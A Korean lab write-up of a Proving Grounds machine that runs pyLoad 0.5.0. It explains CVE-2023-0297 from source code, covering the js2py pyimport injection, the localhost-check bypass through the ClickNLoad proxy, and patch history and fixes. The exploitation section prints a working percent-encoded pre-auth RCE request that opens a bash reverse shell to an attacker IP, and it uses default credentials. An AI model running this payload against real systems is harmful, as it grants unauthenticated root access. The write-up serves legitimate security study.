---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/rce
  - tech/web/auth-bypass
  - tech/web/cmd-injection
  - tech/web/default-creds
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.132.26
ports: [22, 9666]
services: [http, ssh]
cves: [CVE-2023-0297]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.132.26` · Ubuntu 22.04 (커널 5.15.0-75-generic, 호스트명 `pyloader`) · Intermediate · 플래그 1개(`/root/proof.txt`)
> 진입점: 9666 pyLoad 0.5.0 → CVE-2023-0297 pre-auth RCE (`/flash/addcrypted2` 의 `jk` 파라미터 → `js2py` 의 `pyimport`) → 리버스셸
> 권한상승: 없음 — pyLoad 프로세스가 root 로 구동돼 초기 접근이 곧 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.132.26

### Initial Access – ClickNLoad 프록시가 「로컬 전용」 검사를 무력화해 /flash/addcrypted2 의 js2py pyimport 로 pre-auth RCE

**Vulnerability Explanation:** 세 결함이 겹쳐 무인증 원격 코드 실행이 성립함.
- `/flash/addcrypted2` 핸들러가 `jk` 폼 파라미터를 `eval_js(f"{jk} f()")` 로 필터 없이 평가 — CWE-94 Code Injection
- 평가기 `js2py` 가 자체 확장 키워드 `pyimport` 를 제공해 임의 파이썬 모듈을 JS 스코프로 끌어옴. 샌드박스 탈출이 아니라 **설계된 상호운용 통로**임
- 핸들러의 유일한 접근제어 `@local_check` 가 `REMOTE_ADDR`·`HTTP_HOST` 를 신뢰하는데, pyLoad 기본 탑재 `ClickNLoad` 애드온(`extern=True`)이 9666 을 외부에 열어 `127.0.0.1:8000` 으로 원시 TCP 포워딩함 → 원격 요청의 `REMOTE_ADDR` 이 `127.0.0.1` 로 뒤바뀜
- `pyload-ng < 0.5.0b3.dev31` 해당 · CVSS 3.1 = 9.8 CRITICAL

**Vulnerability Fix:**
- `pyload-ng` 를 `0.5.0b3.dev31` 이상으로 업그레이드. 그것만으로는 부족함 — 같은 엔드포인트의 후속 CVE-2024-39205(`<= 0.5.0b3.dev85`)까지 넘겨야 하고, 근본 해결은 js2py 를 걷어낸 2025-08 이후 판본임
- `ClickNLoad` 애드온의 `extern` 을 `False` 로 내릴 것 — 9666 이 `127.0.0.1` 에만 바인드돼 원격 요청이 `local_check` 에 막힘. Click'n'Load 를 안 쓰면 `enabled` 를 아예 `False` 로. **가장 값싼 조치임**
- 접근제어를 `REMOTE_ADDR`·`HTTP_HOST` 로 하지 말 것 — 전자는 프록시 한 겹이면 무너지고 후자는 클라이언트가 정하는 값임. 네트워크 계층(바인드 주소·방화벽)이나 실제 인증 토큰으로 옮길 것
- `/flash/*` 가 필요 없으면 엔드포인트 자체를 비활성화할 것. 인증 예외 + 경로 프리픽스 면제 + 와일드카드 CORS 가 겹쳐 있어 웹UI 를 하위 경로로 옮겨 숨겨도 소용없음
- CNL 키 추출을 정규식 파싱으로 대체해 임의 코드 평가를 없앨 것. `js2py.disable_pyimport()` 호출은 최소선이자 불충분선임(CVE-2024-39205 가 증명)
- 웹UI 를 `0.0.0.0` 이 아니라 루프백에 바인드하고 SSH 터널·VPN 뒤에 둘 것 — 「로컬에서만 온다」는 가정을 바인드 주소로 강제
- pyLoad 를 root 로 실행하지 말 것 — 전용 계정 systemd 유닛(`User=pyload`·`ProtectSystem=strict`·`PrivateTmp=yes`·`NoNewPrivileges=yes`). 이것 하나로 RCE 가 root 침해가 아니라 서비스 계정 침해로 격하됨
- 기본 자격증명 `pyload/pyload` 를 최초 기동 시 변경 강제. 이 CVE 와 무관하게 관리 UI 전권을 그냥 내주는 문제임
- 아웃바운드를 화이트리스트로 제한하면 리버스셸이 막힘. `/flash/addcrypted2` 로의 외부 IP 발 POST 는 정상 트래픽이 아니라 WAF/IDS 규칙 한 줄로 탐지됨

**Severity:** Critical — 무인증 원격 RCE, 프로세스가 root 로 구동돼 즉시 root

**Steps to reproduce the attack:**
1. `-p-` 전수 스캔 → 9666/tcp 에서 `http-title: Login - pyLoad`
2. 기본 자격증명 `pyload` / `pyload` 로 웹UI 로그인 → 정보 페이지에서 버전 `0.5.0` 과 `Config Folder: /root/.pyload` 확인
3. Kali 에 `rlwrap nc -lnvp 4444` 리스너 기동
4. `POST /flash/addcrypted2` 에 `jk` 파라미터로 `pyimport os;os.system("bash -c '<리버스셸>'");f=function f2(){};` 를 퍼센트 인코딩해 전송
5. 리스너에 root 셸 수신 → `cat /root/proof.txt`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.132.26 | TCP: 22, 9666 |

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ nnmap 192.168.132.26
# Nmap 7.98 scan initiated Mon Jun 29 10:45:55 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.132.26
Nmap scan report for 192.168.132.26
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.132.26:9666/
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.52 ms 192.168.45.1
2   66.47 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.26 ms 192.168.132.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 29 10:46:49 2026 -- 1 IP address (1 host up) scanned in 53.56 seconds
```
— 출처: `~/PG/pyLoader/nmap.log`

`nnmap` 은 표준 도구가 아니라 Kali `~/.zshrc` 의 개인 별칭임.

```bash
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

nmap 이 로그 첫 줄에 남긴 실제 argv 가 이를 확인해 줌 — `/usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. `--privileged` 와 `/usr/lib/nmap/nmap` 경로는 Kali 의 `/usr/bin/nmap` 래퍼가 붙인 것임(nmap 바이너리에 capability 가 부여돼 있어 `sudo` 없이 SYN 스캔이 됨). **시험장 머신에는 이 별칭이 없음** — 아래 플래그를 손으로 칠 수 있어야 함.

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 이 박스에서는 손해 없음. 9666 은 `nmap-services` 에 `zoomcp` 로 등재돼 있고 개방빈도가 top-1000 커트라인의 두 배라 기본 스캔도 프로브함. `-p-` 의 실익은 **미등재 고번호 포트**에서 나옴([[_PLAYBOOK#A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다]]) |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Login - pyLoad` 가 안 나옴. `9666/tcp open unknown` 만 보고 정체를 모른 채 넘어감 |
| `-Pn` | ping 사전 탐지 생략 | PG 랩은 ICMP 를 막는 경우가 흔함. 빼면 「호스트 다운」으로 스캔 자체를 건너뜀 |
| `-A` | OS 추측 + traceroute | 여기서는 OS 추측이 틀렸음. 있어도 손해는 없음 |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔이 53초에 끝남. 빼면 수십 분 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 재실행 없이 다시 봄. 시험 리포트 증거로도 씀 |

> [!danger] 「9666 은 기본 1000포트에 없다」는 틀렸다
> 「`-p-` 없이 스캔하면 22번만 보인다」는 반증됨. Kali nmap 7.98 실측:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ grep -P "\t9666/tcp\t" /usr/share/nmap/nmap-services
> zoomcp	9666/tcp	0.000304	# Zoom Control Panel Game Server Management
>
> └─$ awk -F'\t' '$2 ~ /\/tcp$/ {print $3}' /usr/share/nmap/nmap-services | sort -rn | sed -n 1000p
> 0.000152                    ← top-1000 의 커트라인 빈도
> ```
> 9666 의 빈도 `0.000304` 는 커트라인 `0.000152` 의 두 배임. **top-1000 안에 있고 기본 스캔이 실제로 프로브함.**
> ```bash
> └─$ nmap -sT -Pn --top-ports 1000 --packet-trace 127.0.0.1 | grep -c ":9666"
> 2
> ```
>
> 그래도 `-p-` 는 생략하지 않되 **근거를 바꿀 것** — 실익은 `nmap-services` 에 등재되지 않은 고번호 포트에서 나옴. [[Hawat]] 의 50080 이 그 사례이고 거기서는 `-p-` 가 없으면 박스가 통째로 끝남. 좋은 습관을 틀린 근거로 가르치면 독자가 다른 박스에서 top-1000 을 과소평가하게 됨.

**버전 판정 — 독립 근거 2개.** nmap `-A` 는 `MikroTik RouterOS 7.2 - 7.5` 를 후보로 냈으나 **실제는 Ubuntu 22.04** 임. TCP/IP 스택 지문은 가상화 계층·NAT·중간 홉을 4번 지나면 쉽게 뭉개짐. 훨씬 강한 근거는 둘임.

```text
OpenSSH 8.9p1 Ubuntu 3ubuntu0.1     ← 8.9p1 = Ubuntu 22.04 (jammy) 기본 패키지
```
— 출처: `~/PG/pyLoader/nmap.log`

```text
posix linux Linux pyloader 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64
```
— 출처: 스크린샷 `Pasted image 20260629111029.png` (pyLoad 정보 페이지 `OS Platform`)

`-3ubuntu0.1` 같은 데비안/우분투 패키지 리비전 접미사가 배포판과 릴리스를 거의 확정함. 애플리케이션이 스스로 렌더한 `uname` 문자열이 두 번째 독립 근거로 이를 확증함. 같은 방식은 [[Codo]] 에서도 씀.

`Not shown: 65533 closed tcp ports (reset)` 도 읽을 값어치가 있음. `closed` 는 RST 가 돌아왔다는 뜻 — 호스트는 살아 있고, 그 포트에 서비스가 없으며, 방화벽이 패킷을 버리지 않음. [[Squid]] 처럼 `filtered`(무응답)가 대량으로 나오는 것과 정반대라 여기서는 **보이는 2개가 전부**라고 믿어도 됨.

여기서 한 걸음 더 나가면 안 됨. 「그러니 아웃바운드도 열려 있을 가능성이 높다」는 추론이 성립하지 않음. `closed`(RST)는 타겟으로 **들어오는** 방향에 대한 정보일 뿐이고 나가는 트래픽에 대해서는 아무것도 말해주지 않음. 인바운드 무필터 + 아웃바운드 화이트리스트는 흔한 구성임.

실제로 4444 리버스셸이 붙은 것은 사실이나 **결과가 맞았던 것과 추론이 성립하는 것은 별개임.** 아웃바운드는 직접 때려봐야만 앎.

#### 9666 — pyLoad 로그인 화면

```text
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.132.26:9666/
|_http-server-header: Cheroot/8.6.0
```

루트(`/`)를 요청하면 `/login?next=...` 로 302 리다이렉트됨. 모든 것이 인증 뒤에 있는 것처럼 보이는데, 이 인상이 함정임.

![[Pasted image 20260629105530.png]]

`Cheroot/8.6.0` 도 그냥 지나칠 줄이 아님. `CherryPy wsgiserver` / `Cheroot` 는 파이썬 WSGI 서버이므로 **이 앱은 파이썬으로 짜였음.** 그것만으로 공격 가설이 좁혀짐 — 파이썬 웹앱이면 템플릿 인젝션(Jinja2)·역직렬화(pickle)·`eval` 계열이 우선 후보이고 PHP 웹셸 업로드 같은 반사신경은 여기서 쓸모없음. 서버 헤더는 무엇을 공격할지가 아니라 **무엇으로 짜였는지**를 알려주는 줄임.

`robots.txt` 에 `Disallow: /` 한 줄이 있으나(`1 disallowed entry`) 숨겨진 경로 정보는 없음. `Disallow: /` 는 전부 막으라는 뜻이라 알려주는 경로가 하나도 없음. 반대로 `Disallow: /admin-x9/` 같은 항목이었다면 그 자체가 경로 유출이었을 것 — **항목 수만 보고 단서가 있다고 판단하지 말고 내용을 열어볼 것.**

#### 기본 자격증명 → 버전·실행 계정 확정

pyLoad 기본 자격증명을 검색해 `pyload` / `pyload` 획득.

![[Pasted image 20260629105429.png]]

| 배포 형태 | 기본 계정 | 근거 등급 |
|---|---|---|
| pyLoad-ng (현행 기본) | `pyload` / `pyload` ← 이 박스 | 1차 사료 — `pyload/pyload` 소스의 `DEFAULT_USERNAME`/`DEFAULT_PASSWORD = APPID` |
| 구버전(0.4.x) | 고정 기본값 없음 | 1차 사료 — `v0.4.20` 의 `module/setup.py` 가 `self.ask(_("Username"), "User")` 로 대화형 질문하고, `module/config/default.conf` 는 `str username : "Username" = None` |

검색 결과에 흔히 도는 구버전 조합 `admin`/`password` 는 0.4.20 소스에 근거가 없음. 설치 스크립트가 사용자에게 묻고, 제안 기본값은 `"User"` 이며, 설정 파일 초기값은 `None` 임. **[가정]** 어떤 배포판 패키지나 도커 이미지가 `admin`/`password` 를 심었을 가능성은 남으나 확인하지 못함. 실전 영향은 없음 — 이 박스는 `pyload`/`pyload` 로 들어감.

로그인 후 정보 페이지에서 버전과 실행 환경이 통째로 나옴.

![[Pasted image 20260629111029.png]]

| 항목 | 값 | 왜 중요한가 |
|---|---|---|
| pyLoad Version | 0.5.0 | CVE-2023-0297 영향 버전 판정 근거 |
| Python Version | 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0] | Ubuntu 22.04 기본 파이썬 |
| OS Platform | `posix linux Linux pyloader 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64` | 호스트명 `pyloader`·커널·Ubuntu 확정 — nmap 의 MikroTik 추측을 뒤집는 독립 근거 |
| Installation Folder | `/usr/local/lib/python3.10/dist-packages/pyload` | `pip install` 로 시스템 전역 설치(= root 권한으로 설치됨) |
| Config Folder | `/root/.pyload` | ★ pyLoad 가 root 로 돌고 있음 |
| Download Folder | `/root/Downloads/pyLoad` | ★ 같은 결론의 두 번째 독립 근거 |
| WebUI Port | 8000 | ★ 붙은 포트는 9666 임. 오타도 버그도 아님 — `ClickNLoad` 애드온이 9666 을 외부에 열어 8000 으로 프록시함. pre-auth RCE 가 성립하는 이유의 절반이 여기 있음 |

`Config Folder: /root/.pyload` 와 `Download Folder: /root/Downloads/pyLoad` — 일반 계정은 `/root/` 아래에 디렉터리를 만들 수 없음. **이 프로세스는 root 임.** RCE 에 성공하는 순간 그것이 곧 root 셸이라는 뜻이고, 익스플로잇을 던지기 전에 이미 알 수 있었던 사실임. 알고 있으면 셸을 잡은 뒤 `linpeas` 를 돌리는 10분을 아낌.

웹앱 관리 화면에서 경로가 노출되면 반드시 읽을 것. `/root/` 인지 `/home/<user>/` 인지 `C:\Users\<user>\` 인지가 실행 계정을 말해줌. [[Squid]] 의 `phpinfo` → `C:\wamp\` 가 같은 계열의 습관임.

`WebUI Port: 8000` 인데 응답은 9666 에서 옴. 설정값과 현실이 어긋나는 흔한 함정([[Squid]] 의 MariaDB 3307 계열)으로 읽기 쉬우나 여기서는 **둘 다 사실임.** pyLoad 웹UI 본체는 `127.0.0.1:8000` 에서 돌고(기본값 `int port : "Port" = 8000`), `ClickNLoad` 애드온이 별도로 `0.0.0.0:9666` 을 열어 들어온 바이트를 그대로 8000 으로 넘김. nmap 이 9666 에서 `Cheroot/8.6.0` 헤더를 본 것도 프록시가 응답을 가공 없이 통과시켜 뒤쪽 Cheroot 의 헤더가 그대로 새기 때문임.

한 가지 미진한 점은 근거의 개수임. pyLoad `0.5.0` 의 근거는 애플리케이션이 스스로 렌더한 값 하나뿐이라 [[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]·[[Squid]] 에서 굳혀온 「독립 근거 2개」 기준에 못 미침. 다행히 CVE-2023-0297 은 버전 판정이 틀려도 손해가 거의 없음 — 페이로드가 `curl` 한 줄이라 그냥 던지면 3초 안에 결론이 남.

### Initial Access – js2py pyimport pre-auth RCE

나머지 전 페이지가 302 로 튕기는데 `/flash/addcrypted2` 만 로그인 없이 닿음. 그리고 거기에 문자열을 넘기면 파이썬 코드가 실행됨.

#### 배경 — pyLoad 와 Click'n'Load

pyLoad 는 **다운로드 매니저**임. 브라우저에서 「이 링크들 받아줘」를 눌렀을 때 링크 묶음을 받아 처리함. 이 브라우저→로컬앱 연동이 **Click'n'Load(CNL)** 프로토콜이고, JDownloader 계열이 쓰던 방식을 pyLoad 가 호환 구현했으며, 그 수신구가 `/flash/*` 엔드포인트임.

```text
① 웹사이트가 링크 묶음을 AES로 암호화해서 브라우저에 넘긴다   (crypted)
② 복호화 키는 자바스크립트 조각(jk) 형태로 함께 넘어온다
③ 로컬 다운로드 매니저는 그 JS 조각을 실행해서 키를 얻고
④ crypted 를 복호화해 링크 목록을 얻는다
```

③이 이 CVE 의 전부임. **서버가 클라이언트에게서 받은 자바스크립트 문자열을 실행함** — 설계상 그렇게 하도록 되어 있음.

#### `js2py` — 자바스크립트를 파이썬으로 번역해 실행한다

pyLoad 는 JS 엔진을 내장하지 않고 파이썬 라이브러리 `js2py` 를 씀. `js2py` 는 자바스크립트 소스를 파이썬 코드로 번역(transpile)한 뒤 파이썬 인터프리터에서 실행함. 그리고 순수 JS 에 존재하지 않는 자체 확장 키워드가 있음.

```javascript
pyimport os          // ← 자바스크립트에 이런 문법은 없다. js2py가 추가한 것이다
os.system("id")      // 임포트된 파이썬 모듈이 JS 스코프의 객체가 된다
```

흔히 「js2py 샌드박스를 우회했다」고 설명하나 사실이 아님. **`pyimport` 는 js2py 가 의도적으로 제공하는 파이썬 상호운용 기능**이고 탈출할 담장이 애초에 없었음. 그래서 페이로드에 난독화도, 프로토타입 체인 트릭도, `__class__.__mro__` 같은 우회도 필요 없음 — `pyimport os` 라고 쓰면 그냥 됨.

`pyimport` 는 트랜스파일 단계에서 문자 그대로 파이썬 `import` 로 바뀜. js2py 소스(`js2py/translators/translating_nodes.py`)가 그대로 말해줌.

```python
def PyimportStatement(type, imp):
    lib = imp['name']
    jlib = 'PyImport_%s' % lib
    code = 'import %s as %s\n' % (lib, jlib)
    ...
    code += 'var.pyimport(%s, %s)\n' % (repr(lib), jlib)
    return code
```

`pyimport os` → 생성 코드 `import os as PyImport_os` → 그 모듈이 JS 네임스페이스에 객체로 노출됨. 격리 계층이 존재한 적이 없음.

파서 쪽 기본값은 꺼져 있으나(`ENABLE_PYIMPORT = False`) `import js2py` 하는 순간 켜짐(`js2py/translators/translator.py`).

```python
# Enable Js2Py exceptions and pyimport in parser
pyjsparser.parser.ENABLE_PYIMPORT = True
```

**명시적으로 끄지 않는 한 켜져 있는 것이 기본임.** 끄는 API 는 2016년부터 존재했음.

```python
def disable_pyimport():
    import pyjsparser.parser
    pyjsparser.parser.ENABLE_PYIMPORT = False
```

#### 왜 인증 없이 닿는가 — 소스 3개를 겹쳐야 답이 나온다

pyLoad 웹UI 는 로그인 세션이 없으면 전 페이지를 `/login?next=...` 로 302 리다이렉트함 — nmap 이 관측한 그대로임. 그런데 `/flash/*` 만은 다름.

**① 취약 핸들러에는 세션 인증이 아예 없다.**

`src/pyload/webui/app/blueprints/cnl_blueprint.py` (패치 직전 커밋 `6aa71cd9`):

```python
@bp.route("/flash/addcrypted2", methods=["POST"], endpoint="addcrypted2")
@local_check
def addcrypted2():
    package = flask.request.form.get(
        "package", flask.request.form.get("source", flask.request.form.get("referer"))
    )
    crypted = flask.request.form["crypted"]
    jk = flask.request.form["jk"]
    pack_password = flask.request.form.get("passwords")

    crypted = standard_b64decode(unquote(crypted.replace(" ", "+")))
    jk = eval_js(f"{jk} f()")
```

다른 블루프린트는 `login_required(perm)` 데코레이터를 씀. `cnl_blueprint.py` 에는 그 데코레이터가 임포트조차 되어 있지 않고 대신 `@local_check` 하나가 붙어 있음.

인젝션 지점은 **`jk = eval_js(f"{jk} f()")`** 임. 폼 파라미터가 f-string 으로 필터 없이 연결되고 뒤에 `f()` 호출이 붙음 — 페이로드가 `f=function f2(){};` 로 끝나는 이유가 이 한 줄임.

**② `local_check` 는 `REMOTE_ADDR` 을 믿는다.**

같은 파일의 데코레이터 원문:

```python
#: decorator
def local_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        remote_addr = flask.request.environ.get("REMOTE_ADDR", "0")
        http_host = flask.request.environ.get("HTTP_HOST", "0")

        if remote_addr in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost") or http_host in (
            "127.0.0.1:9666",
            "[::1]:9666",
        ):
            return func(*args, **kwargs)
        else:
            return "Forbidden", 403

    return wrapper
```

설계 의도는 「CNL 요청은 로컬 브라우저에서만 온다」임. 실제로 우리 요청은 `REMOTE_ADDR = 192.168.45.156`, `HTTP_HOST = 192.168.132.26:9666` 이라 양쪽 다 불일치이고 **403 이어야 함.** 그런데 셸이 붙었음.

**③ pyLoad 자신이 9666 에 프록시를 세워 `REMOTE_ADDR` 을 위조해준다.**

`src/pyload/plugins/addons/ClickNLoad.py` — pyLoad 기본 탑재 애드온임.

```python
class ClickNLoad(BaseAddon):
    __config__ = [
        ("enabled", "bool", "Activated", True),
        ("port", "int", "Port", 9666),
        ("extern", "bool", "Listen for external connections", True),
        ...
    ]

    def init(self):
        self.cnl_ip = "" if self.config.get("extern") else "127.0.0.1"
        self.cnl_port = self.config.get("port")
```

```python
    @threaded
    def _find_backend(self):
        ...
            web_host = self.pyload.config.get("webui", "host")
            web_port = self.pyload.config.get("webui", "port")
            if web_host in ("0.0.0.0", "::"):
                web_host = "127.0.0.1"          # ← 백엔드에 루프백으로 접속한다
```

```python
                    client_socket, client_addr = dock_socket.accept()
                    ...
                        backend_socket = socket.socket(self.web_af, socket.SOCK_STREAM)
                        ...
                        backend_socket.connect(self.web_addr)
                        self.forward(client_socket, backend_socket, ...)
```

세 가지 기본값이 겹쳐서 이 결과가 나옴.

| 설정 | 기본값 | 결과 |
|---|---|---|
| `enabled` | `True` | 애드온이 그냥 돎. 관리자가 켠 적이 없어도 켜져 있음 |
| `port` | `9666` | nmap 이 본 그 포트 |
| `extern` | `True` | `cnl_ip = ""` → `0.0.0.0` 바인드 → 외부에서 접근 가능 |

그리고 `forward()` 는 원시 TCP 바이트를 그대로 중계함. HTTP 를 해석하지 않으므로 `X-Forwarded-For` 를 붙이지도, `Host` 를 고치지도 않음.

```text
공격자(192.168.45.156)
   │  POST /flash/addcrypted2   Host: 192.168.132.26:9666
   ▼
[0.0.0.0:9666]  ClickNLoad 애드온 (extern=True)      ← pyLoad가 스스로 연 포트
   │  accept() 후 backend_socket.connect(("127.0.0.1", 8000))
   │  바이트 그대로 전달 (헤더 가공 없음)
   ▼
[127.0.0.1:8000]  Cheroot / Flask 웹UI
   │  REMOTE_ADDR = "127.0.0.1"   ← ★ 프록시의 출발지 주소로 뒤바뀌었다
   ▼
local_check → remote_addr in ("127.0.0.1", ...) → True → 통과
   ▼
eval_js(f"{jk} f()")  →  js2py  →  pyimport os  →  os.system()  →  root
```

> [!warning] 이 결론의 근거 등급 — 소스는 실측, 박스 구성은 추론이다
> 위 흐름도에서 소스 인용(애드온 기본값 `enabled=True`·`port=9666`·`extern=True`, 웹UI 기본 포트 8000, `local_check` 구현)은 전부 1차 사료 실측임.
> **[가정]** 다만 이 박스의 `pyload.cfg` 를 직접 읽어 `extern=True` 임을 확인하지는 않았음. 셸에서 `cat /root/.pyload/settings/pyload.cfg` 와 `ss -lntp` 를 찍었어야 완결됨.
> 그럼에도 이 설명을 채택하는 근거는 넷임 — ⑴ 정보 페이지가 웹UI 포트를 8000 으로 렌더했고, ⑵ nmap 은 9666 에서 응답을 받았으며, ⑶ 원격 요청이 `local_check` 를 통과했음(셸이 붙었음), ⑷ **같은 `-p-` 스캔이 8000 을 열린 포트로 보지 않았음**(`Not shown: 65533 closed tcp ports (reset)` — 22·9666 을 뺀 전 포트가 RST). 웹UI 가 외부 인터페이스에 바인드돼 있지 않았다는 뜻이라, 9666 으로 들어온 요청이 루프백을 거쳐 백엔드에 닿았다는 것이 같은 산출물에서 확인됨. 네 관측을 동시에 설명하는 구성은 이것뿐임.
> 대안 가설로 배포된 판본에 `local_check` 가 없었을 가능성이 남음. 그러나 커밋 이력상 `local_check` 는 2020년 이전부터 이 파일에 존재하고 2021-01 에 IPv6 보정까지 받았으므로, 취약 판본(2022~2023 dev 빌드)에 없었을 가능성은 낮음.

`local_check` 자체는 틀린 코드가 아님. 프록시가 없었다면 의도대로 동작함. 무너뜨린 것은 **애플리케이션이 스스로 켜둔 `extern=True` 프록시**임. 보안 검사와 그것을 우회시키는 기능이 같은 제품 안에 기본값으로 공존함.

> [!tip] `/flash/*` 는 숨겨서 막을 수 없다
> 이 블루프린트에는 경로 프리픽스 면제와 와일드카드 CORS 가 더 붙어 있음:
> ```python
> #: url_prefix here is intentional since it should not be affected by path prefix
> bp = flask.Blueprint("flash", __name__, url_prefix="/")
> ...
> response.headers.update({'Access-Control-Allow-Origin': "*", ...})
> ```
> 관리자가 웹UI 를 `/pyload/` 같은 하위 경로로 옮겨도 `/flash/*` 는 루트에 그대로 남음.

#### 영향 범위와 패치 — 1차 사료 기준

| 항목 | 값 | 근거 |
|---|---|---|
| 패키지 | `pyload-ng` (PyPI) | GHSA `GHSA-pf38-5p22-x6h6` |
| 취약 범위 | `< 0.5.0b3.dev31` | 같은 GHSA (`vulnerable_version_range`) |
| 최초 패치 버전 | `0.5.0b3.dev31` (PyPI 업로드 2023-01-03) | 같은 GHSA + PyPI |
| NVD 표현 | "prior to 0.5.0b3.dev31" | NVD CVE-2023-0297 |
| CVSS v3.1 | 9.8 CRITICAL `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | NVD·GHSA 일치 |
| CWE | CWE-94 Code Injection | NVD·GHSA |

화면에 뜬 `0.5.0` 과 실제 패키지 버전은 표기법이 다름. 웹UI 정보 페이지는 `0.5.0` 이라고만 보여주는데 PyPI 의 실제 버전은 `0.5.0b3.dev31` 같은 PEP 440 개발 릴리스 표기임. dev30 이면 취약하고 dev31 이면 안전인데 화면은 둘 다 `0.5.0` 이니 **화면만으로는 취약 여부를 판정할 수 없음.**

참고로 GitHub 저장소의 최신 태그는 `v0.4.20`(2020)임. 0.5.x 는 태그도 릴리스도 없이 PyPI 로만 나갔으므로 GitHub 릴리스 페이지만 보고 최신이 0.4.20 이라고 판단하면 틀림.

패치 커밋은 `7d73ba7919e5`(2023-01-03), 메시지는 `"fix arbitrary python code execution by abusing js2py functionality"` 임. 바뀐 파일은 `src/pyload/core/utils/misc.py` 하나임. 커밋 원문:

```diff
@@ -1,12 +1,11 @@
 # -*- coding: utf-8 -*-
 
 import random
-import socket
 import string
 
 import js2py
 
-from .check import is_mapping
+js2py.disable_pyimport()
 
 
 def random_string(length):
```

`git show --stat` 은 `1 file changed, 1 insertion(+), 2 deletions(-)` 이고 `-import socket` 도 함께 지워짐(같은 커밋에서 미사용 임포트를 정리함).

그리고 이 패치는 취약 엔드포인트를 건드리지 않았음. `cnl_blueprint.py` 는 이 커밋에서 한 글자도 바뀌지 않았고 `local_check` 의 `REMOTE_ADDR` 신뢰도 `eval_js(f"{jk} f()")` 도 그대로 남음. **막은 것은 `pyimport` 뿐임.** 결과도 예상대로였음 — CVE-2024-39205(CVSS 9.8, `pyload-ng <= 0.5.0b3.dev85`)가 같은 `/flash/addcrypted2` 엔드포인트에서 `pyimport` 없이 js2py 샌드박스를 탈출해 RCE 를 재현함. 근본 해결은 2025-08-20 커밋 `aa9300fb4e52` `"remove js2py and dukpy in favour of mini-racer"` 로 js2py 를 통째로 걷어낸 것임.

#### 왜 이 페이로드인가 — 조각별 해설

실제로 날아간 HTTP 요청 본문. `CVE-2023-0297.sh` 의 `--data-binary` 인자에서 `${LHOST}`·`${LPORT}` 를 실행 당시 값으로 치환하고 셸 이스케이프 `\"` 를 푼 것임(스크립트 원문은 `자동 도구 대신 — curl 한 줄` 절).

```text
jk=pyimport%20os;os.system("bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.156%2F4444%200%3E%261%27");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

URL 디코딩하면 `jk` 파라미터의 실체는 이것임.

```javascript
pyimport os;
os.system("bash -c 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1'");
f = function f2(){};
```

| 조각 | 역할 | 빠지면 어떻게 되는가 |
|---|---|---|
| `jk=` | Click'n'Load 의 「복호화 키를 만드는 JS 조각」 파라미터. 서버가 이 값을 `js2py` 에 넘김 | 다른 파라미터에 넣으면 실행되지 않음. 이것이 유일한 코드 실행 통로임 |
| `pyimport os` | js2py 확장 키워드로 파이썬 `os` 모듈을 JS 스코프에 주입 | 순수 JS 만으로는 OS 명령을 못 부름. **이 한 단어가 CVE 의 본체임** |
| `os.system("...")` | 임포트한 파이썬 모듈로 셸 명령 실행 | — |
| `f=function f2(){};` | `f` 라는 이름의 함수를 정의 | 핸들러 코드가 `eval_js(f"{jk} f()")` 이므로 평가되는 최종 JS 는 `<페이로드> f()` 임. `f` 가 정의돼 있지 않으면 그 자리에서 `ReferenceError` 가 남. 명령은 이미 그 앞줄에서 실행된 뒤라 셸은 붙으나 예외 없이 끝내려고 넣음. 이름이 `f` 인 것은 우연이 아니라 소스에 하드코딩된 호출명임 |
